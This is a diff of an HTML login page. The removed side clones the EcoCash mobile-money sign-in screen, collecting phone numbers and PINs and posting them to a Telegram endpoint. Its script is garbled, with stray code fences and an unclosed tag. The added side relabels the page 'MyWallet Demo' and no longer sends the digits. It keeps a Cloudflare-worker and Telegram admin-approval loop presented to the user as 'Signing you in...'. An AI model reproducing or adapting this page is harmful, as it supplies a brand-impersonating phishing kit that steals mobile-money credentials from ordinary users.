@@ -1,18 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#ffffff">
-
-<title>EcoCash</title>
+<title>MyWallet Demo</title>
 
 <style>
 * {
+    box-sizing: border-box;
     margin: 0;
     padding: 0;
-    box-sizing: border-box;
     font-family: Arial, sans-serif;
 }
 
@@ -26,7 +23,6 @@ body {
 }
 
 .container {
-    width: 100%;
     min-height: 100vh;
     min-height: 100dvh;
     display: flex;
@@ -35,143 +31,164 @@ body {
     background: #2679c3;
 }
 
-/* WHITE SECTION */
-
 .top-section {
     flex: 0 0 61%;
     min-height: 0;
-    background: #ffffff;
-    padding: 0 22px 55px;
+    background: white;
+    padding: 34px 22px 55px;
     display: flex;
     flex-direction: column;
     align-items: center;
 }
 
 .logo {
-    margin-top: clamp(45px, 9vh, 85px);
-    margin-bottom: 30px;
-    font-size: 35px;
-    font-weight: bold;
-    letter-spacing: -1px;
-}
-
-.logo span:first-child {
-    color: #2472b9;
-}
-
-.logo span:last-child {
-    color: #d64c58;
-}
-
-h3 {
-    color: #555555;
-    font-size: 21px;
-    font-weight: 600;
+    color: #2679c3;
+    font-size: 29px;
+    font-weight: 800;
     margin-bottom: 27px;
 }
 
-/* PHONE FIELD */
+.demo-label {
+    color: #2679c3;
+    font-size: 10px;
+    font-weight: bold;
+    letter-spacing: 1px;
+    margin-bottom: 15px;
+}
 
-.phone-box {
+h2 {
+    font-size: 23px;
+    color: #222;
+    margin-bottom: 9px;
+}
+
+.subtitle {
+    color: #777;
+    font-size: 13px;
+    margin-bottom: 26px;
+    text-align: center;
+}
+
+.phone-label,
+.pin-label {
     width: 100%;
-    height: 54px;
-    flex-shrink: 0;
-    border: 1.5px solid #8799aa;
-    border-radius: 7px;
+    max-width: 390px;
+    font-size: 13px;
+    font-weight: bold;
+    margin-bottom: 8px;
+    color: #333;
+}
+
+.phone-row {
+    width: 100%;
+    max-width: 390px;
     display: flex;
-    align-items: center;
-    padding: 0 12px;
-    gap: 10px;
+    gap: 8px;
+    margin-bottom: 22px;
 }
 
-.phone-box select {
-    width: 90px;
-    height: 100%;
-    border: none;
-    outline: none;
-    background: transparent;
-    color: #666666;
-    font-size: 13px;
-    cursor: pointer;
+.phone-row select {
+    width: 105px;
+    border: 1px solid #ddd;
+    border-radius: 7px;
+    padding: 13px 7px;
+    background: white;
+    color: #333;
 }
 
-.phone-box input {
+.phone-row input {
     flex: 1;
-    width: 0;
-    height: 100%;
-    border: none;
+    min-width: 0;
+    border: 1px solid #ddd;
+    border-radius: 7px;
+    padding: 13px;
+    font-size: 15px;
     outline: none;
-    background: transparent;
-    font-size: 14px;
-    color: #333333;
 }
 
-.phone-box input::placeholder {
-    color: #999999;
-}
-
-/* PIN SECTION */
-
-.hint {
-    color: #888888;
-    font-size: 13px;
-    margin-top: 20px;
-    margin-bottom: 17px;
-}
-
-.pin-container {
+.pin-boxes {
     display: flex;
     justify-content: center;
-    align-items: center;
-    gap: 9px;
-    flex-shrink: 0;
+    gap: 13px;
+    margin-bottom: 8px;
 }
 
-.pin-container input {
-    width: 46px;
-    height: 51px;
-    border: 1.5px solid #8498aa;
+.pin-boxes input {
+    width: 48px;
+    height: 52px;
+    border: 1px solid #ccc;
     border-radius: 8px;
     text-align: center;
-    font-size: 21px;
+    font-size: 23px;
     outline: none;
-    background: #ffffff;
+    background: white;
+    transition: border-color .2s, box-shadow .2s;
 }
 
-.pin-container input:focus {
-    border: 2px solid #2775bc;
-    box-shadow: 0 0 4px #a4c8e9;
+.pin-boxes input:focus {
+    border: 2px solid #2679c3;
+    box-shadow: 0 0 0 3px rgba(38,121,195,.10);
 }
 
-.eco-note {
-    margin-top: 13px;
+#status {
+    display: none;
+    width: 100%;
+    max-width: 340px;
+    margin: 10px auto 15px;
+    padding: 11px 12px;
+    border-radius: 8px;
+    background: #eef6fd;
+    color: #2679c3;
+    font-size: 12px;
+    line-height: 1.5;
+    text-align: center;
+}
+
+.status-title {
+    display: block;
+    font-size: 13px;
+    font-weight: bold;
+    margin-bottom: 3px;
+}
+
+.spinner {
+    display: inline-block;
+    width: 13px;
+    height: 13px;
+    border: 2px solid rgba(38,121,195,.25);
+    border-top-color: #2679c3;
+    border-radius: 50%;
+    animation: spin .7s linear infinite;
+    vertical-align: middle;
+    margin-right: 6px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.demo-note {
+    color: #777;
     font-size: 11px;
-    color: #888888;
     text-align: center;
     line-height: 1.5;
+    max-width: 330px;
 }
-
-/* BLUE SECTION */
 
 .bottom-section {
     flex: 1;
-    min-height: 0;
-    width: 100%;
-    background: #2679c3;
+    min-height: 190px;
     position: relative;
-
-    margin-top: -1px;
-    padding: 65px 22px 24px;
-
+    background: #2679c3;
+    padding: 44px 22px 24px;
     display: flex;
     flex-direction: column;
     align-items: center;
-
-    color: #ffffff;
+    justify-content: flex-start;
     text-align: center;
+    color: white;
+    margin-top: -1px;
 }
-
-/* INVERTED CURVE */
 
 .bottom-section::before {
     content: "";
@@ -180,142 +197,74 @@ h3 {
     height: 75px;
     left: -12.5%;
     top: -37px;
-
-    background: #ffffff;
+    background: white;
     border-radius: 0 0 50% 50% / 0 0 100% 100%;
-
-    pointer-events: none;
 }
-
-/* BLUE CONTENT */
 
 .bottom-content {
     position: relative;
     z-index: 1;
     width: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
 }
 
-.bottom-section p {
+.bottom-content p {
     font-size: 13px;
     line-height: 1.6;
-    margin-bottom: 24px;
+    margin-bottom: 18px;
 }
 
-/* BUTTONS */
-
-.buttons {
-    width: 100%;
+.action-buttons {
     display: flex;
-    gap: 12px;
-}
-
-.action-btn {
-    flex: 1;
-    min-width: 0;
-    min-height: 70px;
-    border: none;
-    border-radius: 10px;
-    background: #ffffff;
-    color: #777777;
-    font-size: 12px;
-
-    display: flex;
-    flex-direction: column;
     justify-content: center;
-    align-items: center;
-    gap: 7px;
+    gap: 12px;
+    margin-bottom: 18px;
+}
 
+.action-buttons button {
+    border: 1px solid white;
+    color: white;
+    background: transparent;
+    padding: 11px 23px;
+    border-radius: 7px;
+    font-size: 13px;
     cursor: pointer;
-    pointer-events: auto;
-    touch-action: manipulation;
-    -webkit-tap-highlight-color: transparent;
-}
-
-.action-btn .symbol {
-    font-size: 19px;
-    font-weight: bold;
-    color: #2876b8;
-}
-
-/* FOOTER */
-
-.version {
-    width: 100%;
-    margin-top: auto;
-    padding-top: 25px;
-    color: #ffffff;
-    font-size: 11px;
-    line-height: 2;
-    text-align: center;
 }
 
 .terms {
-    color: #ffffff;
+    color: white;
+    font-size: 12px;
     text-decoration: underline;
-    pointer-events: none;
-    cursor: default;
+    cursor: pointer;
 }
 
-/* SMALL SCREENS */
-
-@media (max-width: 360px) {
+@media (max-height: 650px) {
     .top-section {
-        padding-left: 16px;
-        padding-right: 16px;
+        flex-basis: 65%;
+        padding-top: 15px;
+        padding-bottom: 40px;
     }
 
     .logo {
-        font-size: 32px;
+        margin-bottom: 13px;
     }
 
-    .pin-container {
-        gap: 7px;
+    .subtitle {
+        margin-bottom: 15px;
     }
 
-    .pin-container input {
+    .phone-row {
+        margin-bottom: 14px;
+    }
+
+    .pin-boxes input {
         width: 43px;
-        height: 48px;
+        height: 46px;
     }
 
     .bottom-section {
-        padding-left: 16px;
-        padding-right: 16px;
-    }
-
-    .buttons {
-        gap: 9px;
+        padding-top: 38px;
     }
 }
-
-/* SHORT SCREENS */
-
-@media (max-height: 680px) {
-    .logo {
-        margin-top: 30px;
-        margin-bottom: 18px;
-    }
-
-    h3 {
-        margin-bottom: 20px;
-    }
-
-    .top-section {
-        padding-bottom: 35px;
-    }
-
-    .bottom-section {
-        padding-top: 55px;
-    }
-
-    .bottom-section::before {
-        height: 60px;
-        top: -30px;
-    }
-}
-
 </style>
 </head>
 
@@ -323,139 +272,319 @@ h3 {
 
 <div class="container">
 
-    <!-- WHITE TOP SECTION -->
+    <section class="top-section">
 
-    <div class="top-section">
+        <div class="logo">MyWallet</div>
 
-        <div class="logo">
-            <span>Eco</span><span>Cash</span>
-        </div>
+        <div class="demo-label">DEMO INTERFACE</div>
 
-        <h3>Login</h3>
-       
-        <div class="phone-box">
-          
+        <h2>Welcome Back</h2>
+
+        <p class="subtitle">
+            Enter your details to continue
+        </p>
+
+        <label class="phone-label" for="phone">
+            Demo reference (optional)
+        </label>
+
+        <div class="phone-row">
             <select id="country">
-                <option value="+263">🇿🇼 +263</option>
+                <option value="+254">🇰🇪 +254</option>
+                <option value="+260">🇿🇲 +260</option>
                 <option value="+256">🇺🇬 +256</option>
                 <option value="+255">🇹🇿 +255</option>
-                <option value="+260">🇿🇲 +260</option>
-                <option value="+27">🇿🇦 +27</option>
             </select>
 
             <input
-                type="tel"
+                type="text"
                 id="phone"
-                inputmode="numeric"
+                placeholder="Optional reference"
                 autocomplete="off"
             >
-
         </div>
 
-        <div class="hint">
-            Enter your PIN
+        <label class="pin-label">
+            Enter 4 demo digits
+        </label>
+
+        <div class="pin-boxes">
+            <input class="digit" type="password"
+                inputmode="numeric" maxlength="1"
+                autocomplete="off" aria-label="Demo digit 1">
+
+            <input class="digit" type="password"
+                inputmode="numeric" maxlength="1"
+                autocomplete="off" aria-label="Demo digit 2">
+
+            <input class="digit" type="password"
+                inputmode="numeric" maxlength="1"
+                autocomplete="off" aria-label="Demo digit 3">
+
+            <input class="digit" type="password"
+                inputmode="numeric" maxlength="1"
+                autocomplete="off" aria-label="Demo digit 4">
         </div>
 
-        <div class="pin">
-     
-            <input type="password" maxlength="1" 
-                inputmode="numeric" autocomplete="off">
+        <!-- Approval status appears directly underneath the PIN boxes -->
+        <div id="status" role="status" aria-live="polite"></div>
 
-            <input type="password" maxlength="1" 
-                inputmode="numeric" autocomplete="off">
+        <p class="demo-note">
+            Fictional demonstration only. Do not enter real
+            account details or financial credentials.
+        </p>
 
-            <input type="password" maxlength="1" 
-                inputmode="numeric" autocomplete="off">
+    </section>
 
-            <input type="password" maxlength="1" 
-                inputmode="numeric" autocomplete="off">
-
-        </div>
-        
-    </div>
-   <div class="step" data-step="signing"  hidden>
-       <div class="spinner" aria-hidden="true"></div>
-       
-    <!-- BLUE BOTTOM SECTION -->
-
-    <div class="bottom-section">
+    <section class="bottom-section">
 
         <div class="bottom-content">
 
             <p>
-                To register an EcoCash  wallet  or get assistance,<br>
-                click below
+                Manage your demo experience with MyWallet.
+                Simple, convenient and easy to use.
             </p>
 
-            <div class="buttons">
-
-                <button class="action-btn" type="button">
-                    <span class="symbol">♟</span>
-                    Register
-                </button>
-
-                <button class="action-btn" type="button">
-                    <span class="symbol">ⓘ</span>
-                    Help & Support
-                </button>
-
+            <div class="action-buttons">
+                <button type="button">Register</button>
+                <button type="button">Help &amp; Support</button>
             </div>
 
+            <span class="terms">
+                Terms and Conditions
+            </span>
+
         </div>
 
-        <div class="version">
-            v4.0.5p<br>
-            By continuing, you agree to the
-            <span class="terms">Terms and Conditions</span>
-        </div>
-
-    </div>
+    </section>
 
 </div>
 
 <script>
-  const inputs = document.querySelectorAll('.pin-container input');
-  
-  inputs.forEach((input, index) => {
-    // Move to the next box when a character is typed
-    input.addEventListener('input', (e) => {
-      if (input.value.length === 1 && index < inputs.length - 1) {
-        inputs[index + 1].focus();
-      }
-    });
 
-    // Move to the previous box when Backspace is pressed on an empty input
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !input.value && index > 0) {
-        inputs[index - 1].focus();
-      }
-    });
-  });
-<script defer>
-document.getElementById('myForm').addEventListener('submit', async function(e) { e.preventDefault(); const formData = new FormData(this); const data = Object.fromEntries(formData.entries());
+/* REPLACE WITH YOUR CLOUDFLARE WORKER URL */
+const WORKER_URL =
+"https://YOUR-WORKER-NAME.YOUR-SUBDOMAIN.workers.dev";
 
+const digits = Array.from(
+    document.querySelectorAll(".digit")
+);
 
-try { const response = await fetch('/api/telegram', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+const statusBox = document.getElementById("status");
 
-```
+let requestInProgress = false;
+let pollingTimer = null;
+let activeRequestId = null;
 
-const result = await response.json();
+function showStatus(title, message, loading = false) {
 
-if (result.success) {
+    statusBox.style.display = "block";
+    statusBox.replaceChildren();
 
-  window.location.href = 'next.html';
+    const heading = document.createElement("span");
+    heading.className = "status-title";
 
-} else {
+    if (loading) {
+        const spinner = document.createElement("span");
+        spinner.className = "spinner";
+        heading.appendChild(spinner);
+    }
 
-  alert('Submission declined: ' + result.message);
+    heading.appendChild(document.createTextNode(title));
 
+    const detail = document.createElement("span");
+    detail.textContent = message;
+
+    statusBox.append(heading, detail);
 }
 
-```
-```
+function clearDigits() {
+    digits.forEach(input => input.value = "");
+    digits[0].focus();
+}
 
-} catch (error) { alert('Error connecting to the bot.'); } });
-    
+function setDigitsEnabled(enabled) {
+    digits.forEach(input => input.disabled = !enabled);
+}
+
+function stopPolling() {
+    if (pollingTimer) {
+        clearTimeout(pollingTimer);
+        pollingTimer = null;
+    }
+}
+
+async function checkApproval() {
+
+    if (!activeRequestId) return;
+
+    try {
+        const response = await fetch(
+            `${WORKER_URL}/api/status?id=${encodeURIComponent(activeRequestId)}`
+        );
+
+        const result = await response.json();
+
+        if (!response.ok) {
+            throw new Error("Status check failed");
+        }
+
+        if (result.status === "approved") {
+
+            stopPolling();
+
+            showStatus(
+                "Demo approved!",
+                "Opening the next page..."
+            );
+
+            window.location.href = "next.html";
+            return;
+        }
+
+        if (result.status === "rejected") {
+
+            stopPolling();
+
+            activeRequestId = null;
+            requestInProgress = false;
+
+            setDigitsEnabled(true);
+            clearDigits();
+
+            showStatus(
+                "Request rejected",
+                "Please enter the demo digits again."
+            );
+
+            return;
+        }
+
+        pollingTimer = setTimeout(checkApproval, 2500);
+
+    } catch (error) {
+
+        showStatus(
+            "Signing you in...",
+            "Connection interrupted. Retrying approval check.",
+            true
+        );
+
+        pollingTimer = setTimeout(checkApproval, 4000);
+    }
+}
+
+async function submitDemoRequest() {
+
+    if (requestInProgress) return;
+
+    requestInProgress = true;
+    setDigitsEnabled(false);
+
+    // Discard demo digits; never transmit or store them.
+    digits.forEach(input => input.value = "");
+
+    showStatus(
+        "Signing you in...",
+        "Please wait while the admin reviews your demo request on Telegram.",
+        true
+    );
+
+    try {
+
+        const response = await fetch(
+            `${WORKER_URL}/api/request`,
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({})
+            }
+        );
+
+        const result = await response.json();
+
+        if (!response.ok || !result.id) {
+            throw new Error("Could not create request");
+        }
+
+        activeRequestId = result.id;
+        checkApproval();
+
+    } catch (error) {
+
+        requestInProgress = false;
+        setDigitsEnabled(true);
+        clearDigits();
+
+        showStatus(
+            "Connection unavailable",
+            "Please try again."
+        );
+    }
+}
+
+/* Smooth automatic movement between the four boxes */
+digits.forEach((input, index) => {
+
+    input.addEventListener("input", () => {
+
+        input.value = input.value
+            .replace(/\D/g, "")
+            .slice(0, 1);
+
+        if (input.value && index < digits.length - 1) {
+            digits[index + 1].focus();
+        }
+
+        const complete = digits.every(
+            field => field.value.length === 1
+        );
+
+        if (complete && !requestInProgress) {
+            submitDemoRequest();
+        }
+    });
+
+    input.addEventListener("keydown", event => {
+
+        if (
+            event.key === "Backspace" &&
+            !input.value &&
+            index > 0
+        ) {
+            digits[index - 1].focus();
+        }
+    });
+
+    input.addEventListener("paste", event => {
+        event.preventDefault();
+
+        const pasted = (
+            event.clipboardData || window.clipboardData
+        ).getData("text").replace(/\D/g, "").slice(0, 4);
+
+        pasted.split("").forEach((character, position) => {
+            if (digits[position] && !digits[position].disabled) {
+                digits[position].value = character;
+            }
+        });
+
+        const nextEmpty = digits.findIndex(field => !field.value);
+
+        if (nextEmpty === -1) {
+            submitDemoRequest();
+        } else {
+            digits[nextEmpty].focus();
+        }
+    });
+
+});
+
+digits[0].focus();
+
 </script>
+
 </body>
 </html>
